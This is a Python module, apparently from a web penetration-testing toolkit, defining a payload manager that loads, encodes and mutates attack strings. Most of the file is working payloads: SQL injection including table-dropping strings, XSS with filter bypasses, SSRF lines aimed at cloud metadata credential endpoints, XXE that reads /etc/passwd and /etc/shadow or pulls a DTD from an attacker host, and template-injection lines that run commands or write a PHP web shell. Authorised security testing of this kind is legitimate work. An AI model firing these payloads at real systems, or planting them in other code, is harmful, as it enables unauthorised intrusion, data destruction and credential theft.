"""
Payload manager for loading, encoding, and generating attack payloads.
"""

import base64
import html
import itertools
import json
import os
import random
import re
from pathlib import Path
from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple
from urllib.parse import quote, quote_plus

from .utils import setup_logging, read_lines, calculate_entropy

logger = setup_logging("payload_manager")


class PayloadManager:
    """
    Manages attack payloads with loading, encoding, and generation capabilities.

    Features:
    - Load payloads from files
    - Multiple encoding schemes
    - Payload generation/mutation
    - Template variable substitution
    - Payload deduplication
    """

    # Built-in encoding functions
    ENCODINGS = {
        "none": lambda p: p,
        "url": lambda p: quote(p, safe=""),
        "url_plus": lambda p: quote_plus(p),
        "double_url": lambda p: quote(quote(p, safe=""), safe=""),
        "triple_url": lambda p: quote(quote(quote(p, safe=""), safe=""), safe=""),
        "base64": lambda p: base64.b64encode(p.encode()).decode(),
        "base64_url": lambda p: base64.urlsafe_b64encode(p.encode()).decode().rstrip("="),
        "html_entity": lambda p: html.escape(p),
        "html_entity_full": lambda p: "".join(f"&#{ord(c)};" for c in p),
        "html_hex": lambda p: "".join(f"&#x{ord(c):x};" for c in p),
        "unicode_escape": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
        "hex": lambda p: "".join(f"\\x{ord(c):02x}" for c in p),
        "hex_url": lambda p: "".join(f"%{ord(c):02x}" for c in p),
        "octal": lambda p: "".join(f"\\{ord(c):03o}" for c in p),
        "unicode_full": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
        "js_escape": lambda p: p.replace("\\", "\\\\")
        .replace("'", "\\'")
        .replace('"', '\\"')
        .replace("\n", "\\n")
        .replace("\r", "\\r"),
        "json": lambda p: json.dumps(p)[1:-1],  # Strip quotes
        "upper": lambda p: p.upper(),
        "lower": lambda p: p.lower(),
        "reverse": lambda p: p[::-1],
        "spaces_to_tabs": lambda p: p.replace(" ", "\t"),
        "spaces_to_comments": lambda p: p.replace(" ", "/**/"),
        "null_byte": lambda p: p + "\x00",
        "newline": lambda p: p + "\n",
        "carriage_return": lambda p: p + "\r\n",
    }

    def __init__(self, payload_dir: Optional[str] = None):
        """
        Initialize PayloadManager.

        Args:
            payload_dir: Directory containing payload files
        """
        self.payload_dir = Path(payload_dir) if payload_dir else None
        self._cache: Dict[str, List[str]] = {}
        self._custom_encodings: Dict[str, Callable] = {}

    def load_payloads(
        self,
        file_path: str,
        encoding: str = "none",
        dedupe: bool = True,
    ) -> List[str]:
        """
        Load payloads from a file.

        Args:
            file_path: Path to payload file (relative to payload_dir or absolute)
            encoding: Encoding to apply
            dedupe: Remove duplicates

        Returns:
            List of payloads
        """
        # Resolve path
        if self.payload_dir and not os.path.isabs(file_path):
            full_path = self.payload_dir / file_path
        else:
            full_path = Path(file_path)

        cache_key = f"{full_path}:{encoding}"

        if cache_key in self._cache:
            return self._cache[cache_key]

        if not full_path.exists():
            logger.warning(f"Payload file not found: {full_path}")
            return []

        payloads = read_lines(str(full_path))

        if encoding != "none":
            payloads = [self.encode(p, encoding) for p in payloads]

        if dedupe:
            payloads = list(dict.fromkeys(payloads))

        self._cache[cache_key] = payloads
        logger.info(f"Loaded {len(payloads)} payloads from {full_path}")

        return payloads

    def load_category(self, category: str, encoding: str = "none") -> List[str]:
        """
        Load all payloads from a category directory.

        Args:
            category: Category name (sqli, xss, etc.)
            encoding: Encoding to apply

        Returns:
            Combined list of payloads
        """
        if not self.payload_dir:
            logger.warning("No payload directory configured")
            return []

        category_dir = self.payload_dir / category

        if not category_dir.exists():
            logger.warning(f"Category directory not found: {category_dir}")
            return []

        all_payloads = []
        for file_path in category_dir.glob("*.txt"):
            payloads = self.load_payloads(str(file_path), encoding)
            all_payloads.extend(payloads)

        # Dedupe combined list
        return list(dict.fromkeys(all_payloads))

    def encode(self, payload: str, encoding: str) -> str:
        """
        Apply encoding to a payload.

        Args:
            payload: Raw payload
            encoding: Encoding name

        Returns:
            Encoded payload
        """
        # Check custom encodings first
        if encoding in self._custom_encodings:
            return self._custom_encodings[encoding](payload)

        if encoding not in self.ENCODINGS:
            raise ValueError(f"Unknown encoding: {encoding}")

        return self.ENCODINGS[encoding](payload)

    def encode_multi(self, payload: str, encodings: List[str]) -> str:
        """Apply multiple encodings in sequence."""
        result = payload
        for encoding in encodings:
            result = self.encode(result, encoding)
        return result

    def encode_all(self, payload: str, encodings: Optional[List[str]] = None) -> Dict[str, str]:
        """
        Apply all encodings to a payload.

        Returns dict of encoding_name -> encoded_payload
        """
        encodings = encodings or list(self.ENCODINGS.keys())
        return {enc: self.encode(payload, enc) for enc in encodings}

    def register_encoding(self, name: str, func: Callable[[str], str]):
        """Register a custom encoding function."""
        self._custom_encodings[name] = func

    def generate_variants(
        self,
        payload: str,
        encodings: Optional[List[str]] = None,
        mutations: Optional[List[str]] = None,
    ) -> Generator[str, None, None]:
        """
        Generate payload variants with encodings and mutations.

        Args:
            payload: Base payload
            encodings: Encodings to apply
            mutations: Mutation types to apply

        Yields:
            Payload variants
        """
        encodings = encodings or ["none", "url", "double_url", "html_entity"]
        mutations = mutations or []

        seen: Set[str] = set()

        # Base encodings
        for enc in encodings:
            variant = self.encode(payload, enc)
            if variant not in seen:
                seen.add(variant)
                yield variant

        # Apply mutations
        for mutation in mutations:
            mutated = self._apply_mutation(payload, mutation)
            for enc in encodings:
                variant = self.encode(mutated, enc)
                if variant not in seen:
                    seen.add(variant)
                    yield variant

    def _apply_mutation(self, payload: str, mutation: str) -> str:
        """Apply a mutation to a payload."""
        mutations = {
            "case_swap": lambda p: "".join(
                c.upper() if c.islower() else c.lower() for c in p
            ),
            "random_case": lambda p: "".join(
                c.upper() if random.random() > 0.5 else c.lower() for c in p
            ),
            "add_nullbyte": lambda p: p + "%00",
            "add_newline": lambda p: p + "%0a",
            "add_space": lambda p: p + " ",
            "prepend_space": lambda p: " " + p,
            "double": lambda p: p + p,
            "comment_inline": lambda p: p.replace(" ", "/**/"),
            "tab_space": lambda p: p.replace(" ", "\t"),
        }

        if mutation not in mutations:
            return payload

        return mutations[mutation](payload)

    def substitute(self, template: str, variables: Dict[str, Any]) -> str:
        """
        Substitute variables in a payload template.

        Template format: {{variable_name}}

        Args:
            template: Payload template
            variables: Variable values

        Returns:
            Substituted payload
        """
        result = template

        for key, value in variables.items():
            placeholder = "{{" + key + "}}"
            result = result.replace(placeholder, str(value))

        return result

    def expand_templates(
        self,
        templates: List[str],
        variables: Dict[str, List[Any]],
    ) -> Generator[str, None, None]:
        """
        Expand templates with all variable combinations.

        Args:
            templates: List of template payloads
            variables: Dict of variable_name -> list of values

        Yields:
            Expanded payloads
        """
        if not variables:
            yield from templates
            return

        # Generate all combinations
        keys = list(variables.keys())
        value_lists = [variables[k] for k in keys]

        for template in templates:
            for combo in itertools.product(*value_lists):
                var_dict = dict(zip(keys, combo))
                yield self.substitute(template, var_dict)

    def get_sqli_payloads(self, technique: str = "all") -> List[str]:
        """Get built-in SQL injection payloads."""
        payloads = {
            "error": [
                "'",
                "''",
                '"',
                '""',
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                '" OR "1"="1',
                '" OR "1"="1"--',
                "1' ORDER BY 1--",
                "1' ORDER BY 10--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "admin'--",
                "') OR ('1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "1 OR 1=1",
                "' OR ''='",
                "'; DROP TABLE users--",
                "1; DROP TABLE users--",
            ],
            "time": [
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND pg_sleep(5)--",
                "1' AND SLEEP(5)--",
                "1; WAITFOR DELAY '0:0:5'--",
                "' OR SLEEP(5)--",
                "'; SELECT SLEEP(5)--",
                "1 AND SLEEP(5)",
                "' AND BENCHMARK(5000000,MD5('test'))--",
                "1'; WAITFOR DELAY '0:0:5';--",
                "') AND SLEEP(5) AND ('1'='1",
                "1) AND SLEEP(5) AND (1=1",
            ],
            "boolean": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b",
                "1 AND 1=1",
                "1 AND 1=2",
                "' OR 1=1--",
                "' OR 1=2--",
                "1' AND 1=1 AND '1'='1",
                "1' AND 1=2 AND '1'='1",
                "admin' AND 1=1--",
                "admin' AND 1=2--",
            ],
            "union": [
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION ALL SELECT 1--",
                "' UNION ALL SELECT 1,2,3--",
                "-1' UNION SELECT 1,2,3--",
                "1' UNION SELECT 1,user(),3--",
                "1' UNION SELECT 1,@@version,3--",
            ],
        }

        if technique == "all":
            return [p for techniques in payloads.values() for p in techniques]

        return payloads.get(technique, [])

    def get_xss_payloads(self, context: str = "all") -> List[str]:
        """Get built-in XSS payloads."""
        payloads = {
            "html": [
                "<script>alert(1)</script>",
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<object data=javascript:alert(1)>",
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
            ],
            "attribute": [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)'",
                '" onfocus="alert(1)" autofocus="',
                "' onfocus='alert(1)' autofocus='",
                '" onclick="alert(1)',
                "javascript:alert(1)",
                "' onclick='alert(1)'",
                '" onload="alert(1)',
            ],
            "javascript": [
                "'-alert(1)-'",
                '"-alert(1)-"',
                "';alert(1)//",
                '";alert(1)//',
                "\\';alert(1)//",
                "</script><script>alert(1)</script>",
                "{{constructor.constructor('alert(1)')()}}",
                "${alert(1)}",
                "#{alert(1)}",
            ],
            "url": [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "vbscript:alert(1)",
                "javascript:alert(document.domain)",
            ],
            "bypass": [
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<SCRIPT>alert(1)</SCRIPT>",
                "<ScRiPt>alert(1)</sCrIpT>",
                "<script/src=data:,alert(1)>",
                "<svg/onload=alert(1)>",
                "<img src=x onerror=alert`1`>",
                "<img src=x onerror=alert&lpar;1&rpar;>",
                "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "<svg><script>alert&#40;1&#41;</script></svg>",
            ],
        }

        if context == "all":
            return [p for contexts in payloads.values() for p in contexts]

        return payloads.get(context, [])

    def get_ssrf_payloads(self) -> List[str]:
        """Get built-in SSRF payloads."""
        return [
            # Localhost variations
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:8080",
            "http://0.0.0.0",
            "http://0",
            "http://127.1",
            "http://127.0.1",
            # IPv6
            "http://[::1]",
            "http://[0:0:0:0:0:0:0:1]",
            "http://[::ffff:127.0.0.1]",
            # Internal networks
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://192.168.0.1",
            "http://192.168.1.1",
            # Cloud metadata
            "http://169.254.169.254",  # AWS/GCP
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",  # Alibaba
            # DNS rebinding
            "http://localtest.me",
            "http://spoofed.burpcollaborator.net",
            # Protocol smuggling
            "file:///etc/passwd",
            "file://localhost/etc/passwd",
            "gopher://127.0.0.1:25/",
            "dict://127.0.0.1:11211/",
            # Bypass techniques
            "http://127.0.0.1.nip.io",
            "http://127.0.0.1.xip.io",
            "http://0x7f.0x0.0x0.0x1",  # Hex
            "http://2130706433",  # Decimal
            "http://017700000001",  # Octal
            "http://127.0.0.1%00@evil.com",  # Null byte
            "http://evil.com@127.0.0.1",  # Credential bypass
        ]

    def get_xxe_payloads(self) -> List[str]:
        """Get built-in XXE payloads."""
        return [
            # Basic file disclosure
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            # SSRF via XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            # Parameter entities
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>test</foo>',
            # Blind XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]><foo>test</foo>',
            # UTF-7 encoding
            '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM "file:///etc/passwd"+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADsAPA-/foo+AD4-',
        ]

    def get_ssti_payloads(self) -> List[str]:
        """Get built-in SSTI payloads."""
        return [
            # Detection
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "{7*7}",
            "*{7*7}",
            "{{7*'7'}}",
            # Jinja2
            "{{config}}",
            "{{config.items()}}",
            "{{self.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            '{{"".__class__.__bases__[0].__subclasses__()}}',
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            # Freemarker
            "${7*7}",
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            # Twig
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            # Velocity
            "#set($str=$class.inspect('java.lang.String').type)",
            # Smarty
            "{php}echo `id`;{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
            # Mako
            "${self.module.cache.util.os.popen('id').read()}",
            # ERB
            "<%= system('id') %>",
            "<%= `id` %>",
        ]

    def clear_cache(self):
        """Clear the payload cache."""
        self._cache.clear()

    def list_encodings(self) -> List[str]:
        """List all available encodings."""
        return list(self.ENCODINGS.keys()) + list(self._custom_encodings.keys())

    def list_categories(self) -> List[str]:
        """List available payload categories."""
        if not self.payload_dir:
            return []

        return [d.name for d in self.payload_dir.iterdir() if d.is_dir()]
